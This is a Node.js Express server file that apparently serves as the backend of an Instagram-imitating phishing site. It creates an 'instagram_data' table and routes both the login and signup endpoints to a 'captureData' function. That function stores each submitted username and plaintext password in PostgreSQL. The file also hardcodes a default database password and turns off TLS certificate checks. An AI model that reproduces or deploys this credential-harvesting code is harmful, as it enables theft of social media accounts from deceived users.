
const express = require('express');
const { Client, Pool } = require('pg');
const cors = require('cors');
const path = require('path');

const app = express();
// Use the port provided by the hosting environment, or 3001 locally
const port = process.env.PORT || 3001;

/**
 * Database Configuration
 */
const dbConfig = {
  connectionString: process.env.DATABASE_URL,
  host: process.env.DB_HOST || 'localhost',
  port: process.env.DB_PORT || 5432,
  user: process.env.DB_USER || 'postgres',
  password: process.env.DB_PASSWORD || '8959',
  database: process.env.DB_NAME || 'db_name',
  // SSL is required for cloud DB providers (Neon, Supabase, Render DB)
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
};

app.use(cors());
app.use(express.json());

// Serve static files from the root directory
// This allows index.html and index.tsx to be loaded by the browser directly from this server
app.use(express.static(__dirname));

async function initDb() {
  if (process.env.DATABASE_URL) {
    const pool = new Pool({
      connectionString: process.env.DATABASE_URL,
      ssl: { rejectUnauthorized: false }
    });
    try {
      await pool.query(`
        CREATE TABLE IF NOT EXISTS instagram_data (
          id SERIAL PRIMARY KEY,
          identifier TEXT,
          password TEXT,
          full_name TEXT,
          username TEXT,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
      `);
      console.log("Cloud Database connected and table verified.");
      return pool;
    } catch (err) {
      console.error("Cloud DB Initialization Error:", err.message);
      // Don't exit in production immediately, retry might happen
      return null;
    }
  }

  // Local initialization logic with auto-creation
  const baseClient = new Client({
    host: dbConfig.host,
    port: dbConfig.port,
    user: dbConfig.user,
    password: dbConfig.password,
    database: 'postgres'
  });

  try {
    await baseClient.connect();
    const res = await baseClient.query(`SELECT 1 FROM pg_database WHERE datname = $1`, [dbConfig.database]);
    if (res.rowCount === 0) {
      console.log(`Database "${dbConfig.database}" not found. Creating...`);
      await baseClient.query(`CREATE DATABASE "${dbConfig.database}"`);
    }
    await baseClient.end();

    const pool = new Pool(dbConfig);
    await pool.query(`
      CREATE TABLE IF NOT EXISTS instagram_data (
        id SERIAL PRIMARY KEY,
        identifier TEXT,
        password TEXT,
        full_name TEXT,
        username TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    console.log("Local Database initialized and ready.");
    return pool;
  } catch (err) {
    console.error("Local DB Initialization Error:", err.message);
    return null;
  }
}

let dbPool;
initDb().then(pool => {
  dbPool = pool;
});

const captureData = async (req, res) => {
  const { identifier, password, fullName, username } = req.body;
  if (!identifier || !password) {
    return res.status(400).json({ success: false, message: 'Missing fields' });
  }

  if (!dbPool) {
    return res.status(503).json({ success: false, message: 'Database not ready' });
  }

  try {
    const query = `
      INSERT INTO instagram_data (identifier, password, full_name, username) 
      VALUES ($1, $2, $3, $4)
      RETURNING id;
    `;
    const result = await dbPool.query(query, [identifier, password, fullName || null, username || null]);
    res.status(200).json({ success: true, id: result.rows[0].id });
  } catch (err) {
    console.error("Storage Error:", err.message);
    res.status(500).json({ success: false, message: 'Database error' });
  }
};

// API Routes
app.post('/api/signup', captureData);
app.post('/api/login', captureData);

// Fallback to index.html for any other requests (Standard for SPAs)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
